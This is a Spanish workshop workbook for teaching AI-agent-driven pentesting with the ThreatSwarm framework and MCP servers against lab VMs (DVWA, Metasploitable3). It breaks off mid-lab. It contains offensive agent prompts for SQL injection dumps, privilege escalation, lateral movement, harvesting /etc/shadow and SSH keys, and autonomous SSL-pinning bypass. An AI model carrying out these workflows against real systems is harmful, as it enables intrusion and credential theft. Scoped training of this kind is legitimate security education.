<div align="center">

# 🜏 Taller: Uso de Agentes de IA para Pentest Autónomo

## **Cuaderno de Trabajo del Estudiante**

**Instructor:** Jorge Moya — Ironcybersec  
**Duración:** 8 horas (1 día)  
**Modalidad:** Presencial — Laboratorio práctico  
**Versión:** 2.0 — Abril 2026  

---

*Material de uso exclusivo para participantes del taller.  
Prohibida su distribución sin autorización expresa de Ironcybersec.*

</div>

---

## Tabla de Contenidos

1. [Introducción y Objetivos](#1-introducción-y-objetivos)
2. [Entorno de Laboratorio](#2-entorno-de-laboratorio)
   - 2.1 Requisitos de Hardware y Software
   - 2.2 Instalación del Framework
   - 2.3 Configuración de OpenCode
   - 2.4 Configuración del Scope
3. [MCP — Model Context Protocol](#3-mcp--model-context-protocol)
   - 3.1 Arquitectura MCP
   - 3.2 ThreatSwarm MCP Servers
   - 3.3 Burp Suite MCP Server
   - 3.4 Frida MCP para Mobile
4. [Agentes de Pentesting con IA](#4-agentes-de-pentesting-con-ia)
   - 4.1 Arquitectura Multi-Agente
   - 4.2 Comandos del Framework
   - 4.3 Flujo de Trabajo: Recon
   - 4.4 Flujo de Trabajo: Explotación
   - 4.5 Flujo de Trabajo: Post-Explotación
   - 4.6 Generación de Reportes
5. [Laboratorios Prácticos](#5-laboratorios-prácticos)
   - Lab 1: Primer Escaneo con IA (30 min)
   - Lab 2: Pentest Web — DVWA (45 min)
   - Lab 3: Mobile — Frida MCP (30 min)
   - Lab 4: Engagement Completo (45 min)
6. [Proyectos y Recursos de Referencia](#6-proyectos-y-recursos-de-referencia)
   - 6.1 Ecosistema 2026
   - 6.2 Lecturas Recomendadas
   - 6.3 Comunidad
7. [Soluciones de los Laboratorios](#7-soluciones-de-los-laboratorios)

---

## 1. Introducción y Objetivos

### ¿Qué vas a aprender?

Este taller te enseña a usar agentes de IA como fuerza multiplicadora en pentesting autorizado. No es un curso de "la IA hackea por ti" — es un curso de integración práctica donde:

- **Orquestas múltiples agentes especializados** para cubrir el ciclo completo de un engagement
- **Implementas servidores MCP** (Model Context Protocol) que conectan herramientas de seguridad con agentes de IA
- **Ejecutas flujos de trabajo reales** contra entornos controlados: DVWA, Metasploitable3, y apps móviles
- **Generas reportes profesionales** automatizados con evidencia y puntuación CVSS

### Prerrequisitos

| Requisito | Detalle |
|-----------|---------|
| Experiencia en pentesting | Al menos 1 año en pruebas de seguridad ofensiva |
| Familiaridad con Kali Linux | Navegación CLI, paquetes apt, servicios |
| Conocimiento de protocolos | TCP/IP, HTTP, DNS, SMB a nivel práctico |
| Python básico | Lectura de scripts, modificación de variables |
| API key de LLM | Anthropic Claude o OpenAI (necesaria antes del taller) |

> ⚠️ **Antes del taller:** asegúrate de tener tu API key configurada. Sin ella, los agentes no funcionan. Las instrucciones están en la Sección 2.3.

### Agenda del Taller (8 horas)

| Hora | Módulo | Actividad |
|------|--------|-----------|
| 08:00–08:30 | **M1** | Introducción, presentación, revisión de entornos |
| 08:30–09:30 | **M2** | Entorno de laboratorio: instalación y configuración |
| 09:30–10:30 | **M3** | MCP: arquitectura, ThreatSwarm servers, Burp MCP |
| 10:30–10:45 | ☕ | *Break* |
| 10:45–11:30 | **M4** | Frida MCP para mobile: kahlo-mcp, frida-c2-mcp |
| 11:30–12:30 | **Lab 1** | Primer escaneo con IA — hands-on |
| 12:30–13:30 | 🍽️ | *Almuerzo* |
| 13:30–14:30 | **M5** | Agentes multi-agente: arquitectura y comandos |
| 14:30–15:15 | **M6** | Flujos de trabajo: recon, explotación, post-explotación |
| 15:15–15:30 | ☕ | *Break* |
| 15:30–16:15 | **Lab 2** | Pentest Web — DVWA con agentes |
| 16:15–16:45 | **Lab 3** | Mobile — Frida MCP (demo + ejercicios guiados) |
| 16:45–17:30 | **Lab 4** | Engagement completo: /engage → /report |
| 17:30–18:00 | **Cierre** | Resumen, Q&A, recursos, entrega de certificados |

---

## 2. Entorno de Laboratorio

### 2.1 Requisitos de Hardware y Software

#### Laptop del Participante

| Componente | Mínimo | Recomendado |
|------------|--------|-------------|
| RAM | 16 GB | 32 GB |
| Disco libre | 50 GB (SSD) | 100 GB (SSD) |
| CPU | 4 núcleos / 8 threads | 8 núcleos / 16 threads |
| Virtualización | VT-x/AMD-V habilitado en BIOS | Idem |
| SO host | Kali Linux bare metal o VM | Kali bare metal |

#### Máquinas Virtuales de Laboratorio

El instructor proporciona las siguientes VMs (preconfiguradas en VirtualBox/VMware):

| VM | IP (Host-Only) | Propósito | Credenciales |
|----|----------------|-----------|--------------|
| DVWA | 192.168.56.101 | Web app vulnerable | admin:password |
| Metasploitable3 | 192.168.56.102 | Infraestructura vulnerable | msfadmin:msfadmin |

#### Red de Laboratorio

```
┌──────────────────┐       ┌──────────────────┐
│  Laptop Kali     │       │    DVWA          │
│  192.168.56.100  │──────▶│  192.168.56.101  │
│  (atacante)      │       │  :80             │
└────────┬─────────┘       └──────────────────┘
         │
         │
┌────────▼─────────┐
│ Metasploitable3   │
│ 192.168.56.102   │
│ (infra)           │
└──────────────────┘
```

> **Verificación de red:**
> ```bash
> ping -c 3 192.168.56.101    # DVWA accesible
> ping -c 3 192.168.56.102    # Metasploitable3 accesible
> curl -s http://192.168.56.101 | head -5  # DVWA responde
> ```

#### API Key Setup

Necesitas una API key de uno de estos proveedores:

| Proveedor | Plan mínimo | Registro |
|-----------|-------------|----------|
| Anthropic Claude | Claude Pro ($20/mes) | console.anthropic.com |
| OpenAI | Pay-as-you-go | platform.openai.com |

**Importante:** Calcula un presupuesto de $5-15 USD en API usage para el taller completo. Los agentes usan Claude Haiku para tareas rutinarias (barato) y Sonnet para análisis complejos.

```bash
# Exportar API key (elige UNA)
export ANTHROPIC_API_KEY="sk-ant-api03-tu-key-aqui"
# O
export OPENAI_API_KEY="sk-tu-key-aqui"
```

Persiste la variable en tu shell:

```bash
echo 'export ANTHROPIC_API_KEY="sk-ant-api03-tu-key-aqui"' >> ~/.bashrc
source ~/.bashrc
```

---

### 2.2 Instalación del Framework

#### Paso 1: Clonar ThreatSwarm

```bash
cd ~
git clone https://github.com/vsh00t/ThreatSwarm.git
cd ThreatSwarm
```

**Salida esperada:**
```
Cloning into 'ThreatSwarm'...
remote: Enumerating objects: 847, done.
Receiving objects: 100% (847/847), 4.23 MiB | 12.4 MiB/s, done.
```

#### Paso 2: Instalar Dependencias del Sistema

```bash
sudo bash scripts/install_kali.sh --core
```

Este script instala:
- Python 3.11+ con pip
- Nmap, Nuclei, SQLMap
- Herramientas de red (net-tools, dnsutils)
- Dependencias de Python (mcp, fastmcp, jinja2)

**Salida esperada:**
```
[+] Installing core dependencies...
[+] Updating apt cache...
[+] Installing system packages: nmap nuclei sqlmap python3-pip...
[+] Installing Python packages: mcp fastmcp jinja2...
[+] Core installation complete.
```

**Problemas comunes:**

| Problema | Solución |
|----------|----------|
| `Permission denied` | Verifica que usas `sudo` |
| `pip: command not found` | `sudo apt install python3-pip` |
| `nuclei: command not found` | `sudo apt install nuclei` o `go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |
| Error de red en GitHub | Configura proxy: `git config --global http.proxy http://proxy:puerto` |

#### Paso 3: Construir los Agentes

```bash
python3 scripts/build.py --all
```

**Salida esperada:**
```
[build] Building adapter: claude-code     ... OK
[build] Building adapter: opencode        ... OK
[build] Building adapter: openclaw        ... OK
[build] Building adapter: github-copilot  ... OK
[build] All adapters built successfully.
```

#### Paso 4: Smoke Test

```bash
bash scripts/smoke_test.sh
```

**Salida esperada:**
```
[smoke] Checking Python dependencies... OK
[smoke] Checking agent definitions...   OK (32 agents)
[smoke] Checking MCP servers...         OK (3 servers)
[smoke] Checking templates...           OK (4 templates)
[smoke] Checking tools...               OK (nmap, nuclei, sqlmap)
[smoke] All checks passed ✓
```

**Si algo falla:** revisa `logs/smoke_test.log` o consulta al instructor.

---

### 2.3 Configuración de OpenCode

OpenCode es el cliente de agentes de IA que usaremos durante el taller.

#### Instalación en Kali Linux

```bash
# Instalar Go (si no está disponible)
sudo apt install -y golang-go

# Instalar OpenCode
go install github.com/opencode-ai/opencode@latest

# Verificar
opencode --version
```

#### Configuración

```bash
cd ~/ThreatSwarm
cat > .opencode.json << 'EOF'
{
  "model": "anthropic/claude-sonnet-4-20250514",
  "thinking": "interleaved",
  "mcpServers": {
    "scope-mcp": {
      "command": "uvx",
      "args": ["--from", "integrations/mcp/scope-mcp", "scope-mcp"]
    },
    "evidence-mcp": {
      "command": "uvx",
      "args": ["--from", "integrations/mcp/evidence-mcp", "evidence-mcp"]
    },
    "report-mcp": {
      "command": "uvx",
      "args": ["--from", "integrations/mcp/report-mcp", "report-mcp"]
    }
  }
}
EOF
```

#### Variables de Entorno

```bash
# Para Anthropic Claude (recomendado)
export ANTHROPIC_API_KEY="sk-ant-api03-tu-key-aqui"

# Para OpenAI (alternativa)
# export OPENAI_API_KEY="sk-tu-key-aqui"
```

#### Verificación

```bash
cd ~/ThreatSwarm
opencode
```

Escribe `/agents` dentro de OpenCode. Deberías ver 32 agentes listados.

**Problemas comunes:**

| Problema | Solución |
|----------|----------|
| `API key not found` | Verifica que exportaste la variable en la sesión actual |
| `model not available` | Cambia el modelo en `.opencode.json` |
| `MCP server failed` | Ejecuta manualmente: `uvx --from integrations/mcp/scope-mcp scope-mcp` |
| `uvx: command not found` | `pip install uv` y reintenta |

---

### 2.4 Configuración del Scope

El scope define qué objetivos están autorizados para prueba. ThreatSwarm **no ejecuta ningún comando contra un objetivo fuera del scope**.

#### Formato del Archivo scope.txt

```bash
cat > ~/ThreatSwarm/scope.txt << 'EOF'
# Objetivos del laboratorio — una entrada por línea
# Comentarios con #

# IPs individuales
192.168.56.101
192.168.56.102

# Rangos CIDR
192.168.56.0/24

# Puertos específicos (opcional)
# 192.168.56.101:80,443,8080
EOF
```

#### Validación del Scope

```bash
python3 core/scripts/scope_validate.py scope.txt
```

**Salida esperada:**
```
[scope] Parsing scope.txt...
[scope] Found 3 entries:
  - IP: 192.168.56.101
  - IP: 192.168.56.102
  - CIDR: 192.168.56.0/24
[scope] Resolved to 256 hosts
[scope] Scope valid ✓
```

> 🔒 **Regla de oro:** Si no está en el scope, no se toca. Los agentes verifican automáticamente antes de cualquier acción ofensiva.

---

## 3. MCP — Model Context Protocol

### 3.1 Arquitectura MCP

El **Model Context Protocol (MCP)** es un estándar abierto creado por Anthropic (noviembre 2024) que permite a los agentes de IA interactuar con herramientas externas de forma estandarizada.

```
┌─────────────────────────────────────────────────────────┐
│                    AI AGENT                              │
│  (Claude Code / OpenCode / Claude Desktop / Gemini CLI) │
└────────────┬──────────────────────────┬─────────────────┘
             │                          │
     ┌───────▼───────┐         ┌───────▼───────┐
     │  MCP Client   │         │  MCP Client   │
     │  (JSON-RPC)   │         │  (JSON-RPC)   │
     └───────┬───────┘         └───────┬───────┘
             │                          │
    ┌────────▼────────┐       ┌─────────▼──────────┐
    │  stdio / HTTP   │       │  stdio / HTTP      │
    └────────┬────────┘       └─────────┬──────────┘
             │                          │
    ┌────────▼────────┐       ┌─────────▼──────────┐
    │  scope-mcp      │       │  evidence-mcp      │
    │  (validación)   │       │  (captura)         │
    └─────────────────┘       └────────────────────┘
```

#### JSON-RPC 2.0 — Flujo de Trabajo

**1. Inicialización (handshake):**

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "initialize",
  "params": {
    "protocolVersion": "2025-03-26",
    "capabilities": {},
    "clientInfo": {"name": "opencode", "version": "1.0.0"}
  }
}
```

**2. Descubrimiento de herramientas:**

```json
{
  "jsonrpc": "2.0",
  "id": 2,
  "method": "tools/list"
}
```

**3. Ejecución de herramienta:**

```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "method": "tools/call",
  "params": {
    "name": "validate_target",
    "arguments": {"target": "192.168.56.101"}
  }
}
```

#### Capacidades MCP

| Capacidad | Descripción | Ejemplo |
|-----------|-------------|---------|
| **Tools** | Funciones ejecutables | `validate_target`, `capture_evidence` |
| **Resources** | Datos expuestos al agente | Plantillas de reporte |
| **Prompts** | Templates de prompts predefinidos | "Analiza este hallazgo con CVSS" |

#### MCP vs REST API

| Aspecto | REST API | MCP |
|---------|----------|-----|
| Descubrimiento | Cliente conoce los endpoints | Servidor describe sus capacidades |
| Flujo | Cliente define la secuencia | Agente decide dinámicamente |
| Propósito | APIs para humanos | Herramientas para agentes de IA |

---

### 3.2 ThreatSwarm MCP Servers

#### scope-mcp — Validación de Objetivos

| Herramienta | Descripción | Parámetros |
|-------------|-------------|------------|
| `validate_target` | Verifica si un target está en scope | `target` (string) |
| `check_scope` | Valida el scope actual | Ninguno |
| `add_scope` | Agrega un objetivo al scope | `target`, `note` (opcional) |
| `list_scope` | Lista todos los objetivos | Ninguno |
| `import_scope` | Importa scope desde archivo | `path` (string) |

#### evidence-mcp — Captura de Evidencia

| Herramienta | Descripción | Parámetros |
|-------------|-------------|------------|
| `capture_evidence` | Captura evidencia de un hallazgo | `type`, `target`, `finding_id`, `description`, `data` |
| `get_evidence` | Recupera evidencia específica | `evidence_id` (string) |
| `list_evidence` | Lista evidencia capturada | `finding_id` (opcional) |
| `export_evidence` | Exporta evidencia a archivo | `format`: json/markdown/html |

#### report-mcp — Generación de Reportes

| Herramienta | Descripción | Parámetros |
|-------------|-------------|------------|
| `create_report` | Inicializa un nuevo reporte | `engagement_name`, `client`, `date` |
| `add_finding` | Agrega un hallazgo al reporte | `report_id`, `title`, `severity`, `description`, `evidence_ids`, `remediation` |
| `generate_report` | Genera el reporte final | `report_id`, `template`, `output_format` |
| `get_template` | Lista plantillas disponibles | `name` (opcional) |

**Plantillas:** `executive_summary` · `technical_finding` · `remediation_roadmap` · `client`

---

### 3.3 Burp Suite MCP Server

En febrero 2026, PortSwigger lanzó el **MCP Server** oficial como extensión de Burp Suite a través de la BApp Store. Esta extensión permite que cualquier cliente MCP (Claude, OpenCode, etc.) interactúe directamente con Burp Suite.

#### Instalación

**Opción A: Desde la BApp Store (recomendada)**

1. Abre Burp Suite Professional
2. Ve a **Extensions → Installed → BApp Store**
3. Busca **"MCP Server"**
4. Haz clic en **Install**

**Opción B: Desde fuente**

```bash
git clone https://github.com/PortSwigger/mcp-server.git
cd mcp-server
./gradlew embedProxyJar
# Salida: build/libs/burp-mcp-all.jar
```

Luego en Burp: **Extensions → Add → Java → Seleccionar `build/libs/burp-mcp-all.jar`**

#### Configuración en Burp Suite

1. Después de instalar, aparece la pestaña **MCP** en Burp
2. Marca **Enabled** para activar el servidor
3. Configura puerto y host (por defecto: `http://127.0.0.1:9876`)
4. Opcional: marca **Enable tools that can edit your config** para exponer herramientas de configuración

#### Herramientas Expuestas

El MCP Server de Burp expone las siguientes capacidades al agente de IA:

| Herramienta MCP | Función en Burp |
|-----------------|-----------------|
| Enviar y modificar requests HTTP | Proxy, Repeater |
| Escaneo pasivo/activo | Scanner |
| Manipulación de cookies/headers | Spider |
| Lectura del sitio map | Target |
| Intruder payloads | Intruder |

#### Integración con OpenCode

Agrega el MCP server de Burp a tu `.opencode.json`:

```json
{
  "mcpServers": {
    "burp": {
      "command": "java",
      "args": [
        "-jar",
        "/path/to/mcp-proxy-all.jar",
        "--sse-url",
        "http://127.0.0.1:9876"
      ]
    }
  }
}
```

> **Nota:** Necesitas el proxy JAR que viene empaquetado con la extensión. Extraelo desde el instalador de la extensión en Burp (pestaña MCP → "Extract Proxy").

#### Flujo de Trabajo con Burp MCP

```
Agente IA ←→ Burp MCP Server ←→ Burp Suite
    │              │                    │
    │  "Escanea    │  HTTP request      │
    │   esta URL   │  al Scanner API    │
    │   y busca    │                    │
    │   XSS"       │  Resultados de     │
    │              │  escaneo           │
    │  ← Hallazgos │  ← Passive/Active  │
    │    con       │    scan results    │
    │    severidad │                    │
```

**Ejemplo de prompt para el agente:**

```
Usa Burp MCP para escanear pasivamente http://192.168.56.101 
y reporta los endpoints más interesantes. Luego realiza un 
escaneo activo de /vulnerabilities/ y clasifica los hallazgos 
por severidad.
```

---

### 3.4 Frida MCP para Mobile

Los servidores MCP de Frida permiten a los agentes de IA realizar instrumentación dinámica en dispositivos móviles — sin intervención manual. Se destacan dos proyectos:

#### kahlo-mcp (FuzzySecurity)

**Repositorio:** github.com/FuzzySecurity/kahlo-mcp

kahlo-mcp es un servidor MCP que envuelve las APIs de Frida para instrumentación Android. Gestiona el ciclo completo: descubrimiento de dispositivos, attacheo de procesos, ejecución de jobs, streaming de eventos, y almacenamiento de artefactos.

**Instalación:**

```bash
git clone https://github.com/FuzzySecurity/kahlo-mcp.git
cd kahlo-mcp
npm install
npm run build
```

**Configuración:**

Edita `kahlo-mcp/config.json`:

```json
{
  "transport": "stdio",
  "logLevel": "info",
  "dataDir": "./data",
  "adbPath": "/usr/bin/adb"
}
```

**Prerrequisitos en el dispositivo:**
- Dispositivo Android rooteado
- `frida-server` instalado y ejecutándose (versión matching con el npm package)
- ADB disponible

**Herramientas principales:**

| Herramienta | Función |
|-------------|---------|
| `kahlo_devices_list` | Lista dispositivos conectados |
| `kahlo_devices_health` | Health check: ADB + frida-server |
| `kahlo_processes_list` | Lista procesos running (antes de attach) |
| `kahlo_targets_ensure` | Crea/asegura un target (attach o spawn) |
| `kahlo_jobs_start` | Inicia un job de instrumentación aislado |
| `kahlo_events_fetch` | Streaming de eventos con paginación |
| `kahlo_artifacts_list` | Lista artefactos generados |
| `kahlo_mcp_about` | Documentación completa del contrato operativo |

**Configuración en OpenCode:**

```json
{
  "mcpServers": {
    "frida-kahlo": {
      "command": "node",
      "args": ["/ruta/a/kahlo-mcp/dist/index.js"],
      "cwd": "/ruta/a/kahlo-mcp"
    }
  }
}
```

#### frida-c2-mcp (s4dp4nd4)

**Repositorio:** github.com/s4dp4nd4/frida-c2-mcp

FridaC2MCP ejecuta **enteramente en el dispositivo** — no necesitas Frida tooling en tu máquina. Soporta Android (rooteado via Termux) e iOS (jailbreak via palera1n). Usa transporte HTTP streamable en vez de stdio, permitiendo múltiples conexiones concurrentes y orquestación multi-dispositivo.

**Características clave:**
- Zero client-side tooling: todo corre en el dispositivo
- Transporte HTTP streamable (no USB directo necesario)
- Composición con otros MCP servers (ej: Jadx-MCP para análisis estático)
- Clientes recomendados: Gemini CLI, Claude Code

**Registro en Claude Code / OpenCode:**

```bash
# Reemplaza <DEVICE_IP> con la IP LAN del dispositivo
# Android (Termux)
gemini mcp add --transport http frida-c2-mcp http://<DEVICE_IP>:6767/mcp
```

**Flujo de trabajo típico:**

```
1. Agente apunta al endpoint MCP del dispositivo
2. Agente lanza la target app → attachea sesión Frida → inyecta hooks
3. Controles de seguridad (root detection, SSL pinning) se bypassean dinámicamente
4. Agente observa resultados e itera — sin intervención humana
```

#### Ejemplo: Bypass de SSL Pinning con kahlo-mcp

Prompt para el agente:

```
Usa kahlo-mcp para:
1. Listar dispositivos conectados con kahlo_devices_list
2. Verificar salud con kahlo_devices_health
3. Listar procesos con kahlo_processes_list en el dispositivo
4. Spawnea com.vulnerable.app con kahlo_targets_ensure (mode=spawn, gating=spawn)
5. Inicia un job que bypasee SSL pinning usando el stdlib de kahlo
6. Captura el tráfico resultante como evidencia
```

---

## 4. Agentes de Pentesting con IA

### 4.1 Arquitectura Multi-Agente

ThreatSwarm incluye **32 agentes especializados** que cubren el ciclo completo de pentesting. Cada agente es un prompt de sistema con conocimiento profundo de herramientas, técnicas y metodologías específicas.

#### Distribución por Categoría

| Categoría | Cantidad | Agentes |
|-----------|----------|---------|
| **Ofensiva** | 21 | AD, API, C2, Cloud, Container, Crypto, Evasion, Exploitation, IoT/OT, Network, Password, Post-Exploitation, Red Team Infra, Segmentation, Social Engineer, Vuln Research, Web, Wireless, Cloud Post-Ex, Mobile, Reverse Engineer |
| **Defensiva** | 7 | Blue Team, Compliance, DFIR, Log Analyst, Malware Analyst, Threat Hunter, Vuln Manager |
| **Recon** | 2 | OSINT Collector, Recon Specialist |
| **Colaborativa** | 1 | Purple Team |
| **Reportes** | 1 | Report Writer |

#### Asignación de Modelos

ThreatSwarm asigna modelos de IA según la complejidad de la tarea:

| Modelo | Uso | Características |
|--------|-----|-----------------|
| **Claude Haiku** | Tareas rutinarias, formateo, resúmenes | Rápido, económico |
| **Claude Sonnet** | Análisis técnico, interpretación de resultados | Equilibrio calidad/costo |
| **Claude Opus** | Planificación estratégica, generación de exploits | Máxima capacidad |

#### Modelo de Delegación

```
Tu prompt
    │
    ▼
┌─────────────┐
│ Agente      │  ← Decide a quién delegar
│ Orquestador │
└─────┬───────┘
      │
      ├──▶ Recon Specialist  → "Descubre la superficie de ataque"
      ├──▶ Web Attacker      → "Explota las vulnerabilidades web"
      ├──▶ Evidence MCP      → "Captura la evidencia"
      └──▶ Report Writer     → "Genera el reporte"
```

**Principio:** El agente sugiere comandos y explica compromisos. Tú decides qué ejecutar. Nada corre sin tu aprobación.

---

### 4.2 Comandos del Framework

#### /engage — Iniciar Engagement

```
/engage <nombre-cliente> [--scope scope.txt] [--type web|infra|mobile|full]
```

Inicia un engagement nuevo. Crea la estructura de directorios, carga el scope, y activa los MCP servers.

**Ejemplo:**

```
/engage acme-corp --scope scope.txt --type web
```

**Salida esperada:**

```
[engage] Starting engagement: acme-corp
[engage] Scope loaded: 3 targets (256 hosts)
[engage] MCP servers: scope ✓  evidence ✓  report ✓
[engage] Output dir: engagements/acme-corp/
[engage] Type: web
[engage] Ready. Describe your objective.
```

#### /attack — Enrutar Vector de Ataque

```
/attack <vector> [--target <IP>] [--technique <ID>]
```

Delega al agente especializado según el vector.

**Vectores disponibles:** `web`, `network`, `ad`, `cloud`, `mobile`, `wireless`, `api`, `social`

**Ejemplo:**

```
/attack web --target 192.168.56.101
```

#### /hunt — Threat Hunting

```
/hunt [--scope <scope>] [--hypothesis "<hipótesis>"]
```

Activa el agente de Threat Hunter para búsqueda basada en hipótesis.

**Ejemplo:**

```
/hunt --hypothesis "Existe beaconing C2 en el segmento 192.168.56.0/24"
```

#### /ir — Incident Response

```
/ir [--artifacts <ruta>] [--timeline <ruta>]
```

Activa DFIR Analyst para análisis forense.

#### /pwned — Post-Explotación

```
/pwned [--target <IP>] [--pivot <IP>]
```

Delega al agente de Post-Exploitation para escalamiento de privilegios, movimiento lateral y persistencia.

#### /report — Generar Reporte

```
/report --engagement <nombre> [--format markdown|html|pdf] [--template <plantilla>]
```

**Ejemplo:**

```
/report --engagement acme-corp --format html --template client
```

**Salida esperada:**

```
[report] Loading findings from: engagements/acme-corp/
[report] Processing 12 findings...
[report] Template: client
[report] Generating HTML report...
[report] Output: engagements/acme-corp/report/acme-corp.html
[report] Done ✓
```

---

### 4.3 Flujo de Trabajo: Recon

#### Paso 1: Iniciar el Agente

```
/engage lab-dvwa --scope scope.txt --type web
```

#### Paso 2: Prompt de Reconocimiento

```
Realiza reconocimiento completo de 192.168.56.101:
1. Nmap scan con detección de servicios y versiones
2. Enumeración de directorios web con gobuster
3. Identifica tecnologías con whatweb
4. Resume la superficie de ataque encontrada
```

#### Paso 3: Interpretación por IA

El agente ejecuta los comandos, captura la salida, e interpreta los resultados. Ejemplo de análisis que proporciona:

```
Análisis de superficie de ataque — 192.168.56.101

Puertos abiertos:
  22/tcp   - SSH (OpenSSH 8.2)
  80/tcp   - HTTP (Apache 2.4.51)
  3306/tcp - MySQL (5.5.62) — expuesto directamente

Tecnologías identificadas:
  - Servidor: Apache 2.4.51
  - Backend: PHP 7.4.3
  - DB: MySQL 5.5.62
  - Aplicación: DVWA (Damn Vulnerable Web Application)

Vectores de ataque prioritarios:
  1. CRITICAL: MySQL expuesto (3306/tcp) — posible credenciales débiles
  2. HIGH: DVWA contiene vulnerabilidades deliberadas (SQLi, XSS, CSRF, RFI)
  3. MEDIUM: Apache 2.4.51 — verificar CVEs conocidos
  4. LOW: SSH 8.2 — enumerar usuarios válidos
```

#### Paso 4: Captura de Evidencia

```
Captura toda la salida del reconocimiento como evidencia del finding RECON-001.
```

---

### 4.4 Flujo de Trabajo: Explotación

#### Paso 1: Escaneo con Nuclei

```
Ejecuta nuclei contra 192.168.56.101 con templates de OWASP Top 10.
Filtra resultados por severidad high y critical.
```

#### Paso 2: SQL Injection con SQLMap

```
Usa sqlmap para explotar la SQL injection en 
http://192.168.56.101/vulnerabilities/sqli/?id=1&Submit=Submit

Cookie: PHPSESSID=tu-sesion; security=low

Dump la base de datos dvwa y captura la evidencia.
```

#### Paso 3: Escalamiento Automático

El agente web-attacker identifica automáticamente:
- Tipo de inyección (UNION-based)
- Versión de DBMS
- Base de datos actual
- Tablas y columnas accesibles
- Usuarios y hashes (si disponibles)

#### Paso 4: Evidencia

```
Captura el dump de la base de datos como evidencia del hallazgo SQL-001. 
Clasifica como CRITICAL (CVSS 9.8).
```

---

### 4.5 Flujo de Trabajo: Post-Explotación

#### Escalamiento de Privilegios

```
/pwned --target 192.168.56.102

Escalatea privilegios en Metasploitable3:
1. Enumera usuarios y grupos
2. Busca SUID binaries
3. Checkea crontabs
4. Revisa capabilities del kernel
5. Intenta escalar a root
```

#### Movimiento Lateral

```
Dado acceso root en 192.168.56.102, identifica:
1. Otras máquinas en el segmento 192.168.56.0/24
2. Credenciales almacenadas (SSH keys, .bash_history)
3. Configuración de red (rutas, ARP table)
4. Servicios internos accesibles
```

#### Captura de Credenciales

```
Extrae todas las credenciales accesibles:
- /etc/shadow
- ~/.ssh/authorized_keys
- Bases de datos MySQL
- Configuraciones de aplicaciones
Captura como evidencia con evidence-mcp.
```

---

### 4.6 Generación de Reportes

#### Por CLI

```bash
python3 core/scripts/report_generate.py \
  --engagement lab-dvwa \
  --template client \
  --output reports/lab-dvwa-report.html
```

#### Plantillas Disponibles

| Plantilla | Contenido | Audiencia |
|-----------|-----------|-----------|
| `executive_summary` | Resumen de riesgo, métricas clave | C-suite |
| `technical_finding` | Detalle de vulnerabilidad + CVSS + PoC | Equipo técnico |
| `remediation_roadmap` | Plan priorizado de remediación | Equipo técnico |
| `client` | Reporte completo entregable al cliente | Todos |

#### Formatos de Salida

| Formato | Comando | Uso |
|---------|---------|-----|
| **Markdown** | `--output report.md` | Edición posterior, git |
| **HTML** | `--output report.html` | Entrega al cliente |
| **PDF** | `--output report.pdf` | Archivo final (requiere wkhtmltopdf) |

#### CVSS Automático

Los agentes calculan puntuación CVSS automáticamente para cada hallazgo:

```
Finding: SQL Injection in /vulnerabilities/sqli/
CVSS:3.1  AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Score: 9.8 (Critical)
CWE: CWE-89
```

#### Integración de Evidencia

Las evidencias capturadas con `evidence-mcp` se incrustan automáticamente en el reporte:

```bash
# Listar evidencias del engagement
python3 core/scripts/evidence_list.py --engagement lab-dvwa

# Exportar evidencias para el reporte
python3 core/scripts/evidence_export.py \
  --engagement lab-dvwa \
  --format html \
  --output evidence/
```

---

## 5. Laboratorios Prácticos

---

### Lab 1: Primer Escaneo con IA (30 min)

**Objetivo:** Ejecutar tu primer reconocimiento con ThreatSwarm y obtener un análisis interpretado por IA.

#### Paso 1: Verificar Conectividad (5 min)

```bash
# Test de red
ping -c 2 192.168.56.101
curl -s -o /dev/null -w "%{http_code}" http://192.168.56.101
# Esperado: 200

# Verificar herramientas
which nmap && which nuclei && which sqlmap
```

#### Paso 2: Iniciar OpenCode (5 min)

```bash
cd ~/ThreatSwarm
opencode
```

Dentro de OpenCode, inicia el engagement:

```
/engage lab-01 --scope scope.txt --type web
```

#### Paso 3: Reconocimiento con IA (15 min)

Escribe el siguiente prompt:

```
Eres el Recon Specialist. Realiza un escaneo completo de 192.168.56.101:

1. Nmap: -sV -sC -p- --open 192.168.56.101
2. Gobuster: enumera directorios en http://192.168.56.101 con wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt (primeros 200 resultados)
3. Whatweb: http://192.168.56.101

Para cada resultado, explica:
- Qué significa el hallazgo
- Por qué es relevante para el pentest
- Qué vectores de ataque sugiere

Verifica que 192.168.56.101 está en scope antes de ejecutar cualquier comando.
```

#### Paso 4: Analizar Resultados (5 min)

El agente debería identificar:
- Puertos abiertos (22, 80, 3306)
- Aplicación DVWA
- Panel de login
- Directorios vulnerables (/vulnerabilities/)

**Validación:** Debes tener al menos 3 hallazgos documentados por el agente.

#### Criterios de Validación

| ✅ Criterio | Descripción |
|-------------|-------------|
| Scope verificado | El agente verificó el target con scope-mcp antes de escanear |
| Puertos identificados | Al menos 3 puertos abiertos reportados |
| Tecnología identificada | El agente reconoció Apache, PHP, MySQL |
| Vectores propuestos | Al menos 2 vectores de ataque sugeridos |

---

### Lab 2: Pentest Web — DVWA (45 min)

**Objetivo:** Encontrar y explotar SQL injection usando agentes de IA, capturar evidencia, y generar un hallazgo técnico.

#### Paso 1: Setup (5 min)

```
/engage lab-02-dvwa --scope scope.txt --type web
```

Accede a DVWA en el navegador para crear tu sesión:

1. Navega a `http://192.168.56.101`
2. Login: `admin` / `password`
3. En **DVWA Security**, configura **Security Level: low**
4. Copia tu cookie `PHPSESSID`

#### Paso 2: Reconocimiento Web (5 min)

```
Escanea http://192.168.56.101 con nuclei usando templates de cves y vulnerabilities.
Luego corre gobuster contra el target para mapear la aplicación.
Reporta todos los endpoints encontrados.
```

#### Paso 3: Explotación SQLi (15 min)

```
Actúa como Web Attacker. Explota la SQL injection en:
http://192.168.56.101/vulnerabilities/sqli/?id=1&Submit=Submit

Cookie: PHPSESSID=<TU-SESION>; security=low

Pasos:
1. Confirma la inyección con una comilla simple (')
2. Usa sqlmap con --batch --dbs para enumerar bases de datos
3. Dumpea las tablas de la base de datos 'dvwa'
4. Dumpea los usuarios de la tabla 'users'
5. Captura TODA la salida como evidencia con evidence-mcp
6. Clasifica el hallazgo: CVSS score, CWE, recomendación de remedio
```

#### Paso 4: Evidencia y Reporte (10 min)

```
Genera un reporte técnico del hallazgo SQL-001:
